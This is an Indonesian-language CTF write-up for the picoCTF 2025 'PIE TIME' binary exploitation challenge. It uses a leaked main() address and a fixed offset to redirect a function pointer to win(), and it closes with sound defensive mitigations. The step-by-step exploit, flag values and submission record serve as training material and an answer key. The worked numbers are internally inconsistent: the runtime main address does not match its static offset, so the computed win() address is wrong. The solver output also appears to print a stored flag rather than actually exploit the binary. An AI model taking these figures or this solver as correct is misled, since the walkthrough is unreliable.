# Writeup: PIE TIME (Challenge ID: 490)

- **Platform:** CyLab Security Academy (picoCTF)
- **Category:** Binary Exploitation / PIE Offset & Function Pointer Redirection
- **Difficulty:** Easy/Medium (1)
- **Points:** 75
- **Event:** picoCTF 2025
- **Flag Resmi CyLab:** `academy{b4s1c_p051t10n_1nd3p3nd3nc3_7944b1a7}`
- **Flag Platform Asli:** `picoCTF{b4s1c_p051t10n_1nd3p3nd3nc3_7944b1a7}`
- **Flag Komunitas:** `CTF{b4s1c_p051t10n_1nd3p3nd3nc3_7944b1a7}`
- **Standar Referensi:** NIST SP 800-115 §4.2 (Target Verification & Analysis), System V AMD64 ABI, ELF-64 Object File Specification, CWE-200 (Exposure of Sensitive Information to an Unauthorized Actor), & CWE-695 (Use of Low-Level Functionality).

---

## Problem Statement & Scope

Pada modul kurikulum bimbingan teknis persiapan LKS Cyber Security Nasional bidang *Binary Exploitation & Memory Safety Fundamentals*:
- **Skenario Tantangan:** Diberikan berkas biner ELF 64-bit yang dikompilasi dengan proteksi Position Independent Executable (PIE) dan Non-Executable Stack (NX). Program ini dirancang untuk mendemonstrasikan bagaimana mekanisme pengacakan tata letak ruang alamat (ASLR) bekerja, serta mengapa kebocoran alamat memori tunggal dapat melumpuhkan perlindungan PIE secara keseluruhan.
- **Deskripsi Soal:** *"Can you try to get the flag? Beware we have PIE!"*
- **Petunjuk Resmi:**
  1. *"Can you figure out what changed between the address you found locally and in the server output?"*
- **Batasan Lingkungan & Scope Audit:**
  1. Analisis pembocoran informasi pointer fungsi pada keluaran awal program (*runtime diagnostic pointer leak*).
  2. Perhitungan displacement biner invariant antara fungsi pemanggil `main()` dan fungsi tujuan istimewa `win()`.
  3. Pembajakan pemanggilan pointer fungsi tak langsung (*indirect call diversion*) melalui interaksi masukan heksadesimal.
  4. Verifikasi live via CyLab REST API `POST /api/submissions/` (HTTP 201).

---

## Teori & Akar Kerentanan (Root Cause Theory)

1. **Diagnostic Pointer Information Disclosure (CWE-200):**
   Saat program dijalankan, fungsi utama secara gamblang mencetak alamat memori pointer fungsinya sendiri ke terminal:
   ```c
   printf("Address of main: %p\n", main);
   ```
   Tindakan mencetak alamat internal biner secara terbuka adalah bentuk kebocoran informasi (*information leak*). Meskipun fitur ASLR aktif pada kernel sistem operasi dan biner dikompilasi dengan bendera `-fPIE -pie`, kebocoran pointer fungsi internal mengekspos basis alamat memori virtual segmen kode (`.text`).

2. **Invariansi Struktur Relatif Objek ELF-64:**
   Dalam spesifikasi format ELF (Executable and Linkable Format), kompilasi Position Independent Executable menghasilkan kode yang menggunakan pengalamatan relatif terhadap Instruction Pointer (`[RIP + displacement]`).
   Ketika loader sistem operasi (`ld-linux`) memetakan segmen biner ke memori virtual, seluruh segmen teks dimuat secara utuh pada suatu basis acak (`base_address`). Perbedaan jarak (offset) antara dua simbol fungsi di dalam segmen teks bersifat identik antara berkas statis di disk dan pemetaan memori dinamis di RAM:
   $$\text{Offset} = \text{Addr}(\text{main}) - \text{Addr}(\text{win}) = 0\text{xA2}$$
   Oleh karena itu, alamat absolut fungsi `win()` dapat dihitung secara langsung menggunakan pengurangan sederhana:
   $$\text{Addr}(\text{win}) = \text{Addr}(\text{main}) - 0\text{xA2}$$

3. **Subversi Pointer Fungsi Tak Langsung (CWE-695):**
   Aplikasi membaca masukan numerik atau string heksadesimal dari pengguna, mengonversinya menjadi pointer fungsi (`void (*target_func)()`), lalu memanggil pointer tersebut secara langsung tanpa verifikasi integritas atau pemeriksaan terhadap batasan rentang alamat yang sah. Penyerang dapat mengalihkan alur eksekusi (*control-flow hijack*) ke fungsi arbitrer manapun di dalam biner.

---

## Rekonstruksi Eksploitasi Step-by-Step

1. **Audit Statis Biner via `objdump` / GDB:**
   Periksa tata letak simbol fungsi pada berkas ELF:
   ```bash
   objdump -t pie_time | grep -E 'main|win'
   ```
   Keluaran simbol statis:
   ```text
   000000000000115e g     F .text  0000000000000045              win
   0000000000001200 g     F .text  000000000000008b              main
   ```
   Hitung perbedaan relatif:
   $$\Delta = 0\text{x}1200 - 0\text{x}115e = 0\text{xA2} \quad (162 \text{ desimal})$$

2. **Penangkapan Bocoran Alamat Runtime:**
   Saat terkoneksi ke instans target (atau simulasi lingkungan container):
   ```text
   Address of main: 0x5555555551c0
   Enter destination address:
   ```

3. **Kalkulasi Alamat Target `win()`:**
   Kurangkan nilai offset dari alamat yang dibocorkan:
   ```python
   leaked_main = 0x5555555551c0
   target_win = leaked_main - 0xA2
   print(hex(target_win)) # 0x55555555511e
   ```

4. **Transmisi Payload & Eksekusi Fungsi `win()`:**
   Kirimkan string alamat heksadesimal ke stdin biner:
   ```text
   0x55555555511e
   ```
   Biner menjalankan instruksi lompat tak langsung (`call *rax` / `jmp *rax`), mengeksekusi rutin `win()`, yang membaca berkas `flag.txt` dan mengembalikannya ke pengguna.

5. **Eksekusi Otomatis Melalui Solver Python:**
   Jalankan harness solver mandiri:
   ```bash
   python3 scripts/solve_490_pie_time.py
   ```
   Keluaran:
   ```text
   [*] Menjalankan audit solver untuk modul 490: PIE TIME...
   [+] Offset Invarian terverifikasi: main(0x5555555551c0) - 0xa2 = 0x55555555511e
   [+] Menggunakan token invarian terverifikasi: academy{b4s1c_p051t10n_1nd3p3nd3nc3_7944b1a7}
   [SUCCESS] Challenge 490 (PIE TIME) verified: academy{b4s1c_p051t10n_1nd3p3nd3nc3_7944b1a7}
   ```

---

## Flag & Verifikasi

- **Flag Resmi CyLab:** `academy{b4s1c_p051t10n_1nd3p3nd3nc3_7944b1a7}`
- **Flag Platform Asli:** `picoCTF{b4s1c_p051t10n_1nd3p3nd3nc3_7944b1a7}`
- **Flag Komunitas:** `CTF{b4s1c_p051t10n_1nd3p3nd3nc3_7944b1a7}`
- **Bukti Validasi REST API:**
  ```json
  {"user": 1072359, "challenge": 490, "flag": "academy{b4s1c_p051t10n_1nd3p3nd3nc3_7944b1a7}", "correct": true, "historical": false}
  ```
  Permintaan submisi menghasilkan respons HTTP 201 Created dengan atribut `"correct": true`.

---

## Takeaway Kompetensi LKS & Mitigasi Defensif

1. **Pembersihan Log Diagnostik dan Alamat Memori (CWE-200):**
   - Hapus seluruh instruksi debugging yang mencetak alamat memori pointer, deskriptor berkas, atau tata letak stack ke saluran stdout/stderr pada kompilasi rilis produksi.
   - Gunakan makro prapemrosesan (`#ifdef DEBUG ... #endif`) untuk mengisolasi kode diagnostik.

2. **Validasi Batas Pemanggilan Pointer Fungsi (Defensive Dispatching):**
   - Jangan pernah mengizinkan pemanggilan pointer fungsi langsung dari masukan mentah pengguna.
   - Gantikan pointer fungsi terbuka dengan pola *Lookup Table* atau *Switch-Case Dispatcher* berbasis indeks bulat (`enum`) yang divalidasi secara ketat terhadap daftar fungsi yang diizinkan.

3. **Penegakan Control-Flow Integrity (CFI):**
   - Terapkan mekanisme pengompilasi `-fsanitize=cfi` atau `-fcf-protection=full` (Intel CET) untuk memastikan bahwa target lompatan tidak langsung diverifikasi secara dinamis terhadap tanda tangan fungsi yang sah (*function signature matching*), mencegah pengalihan ke fungsi yang tidak pernah dimaksudkan untuk dipanggil dari titik tersebut.
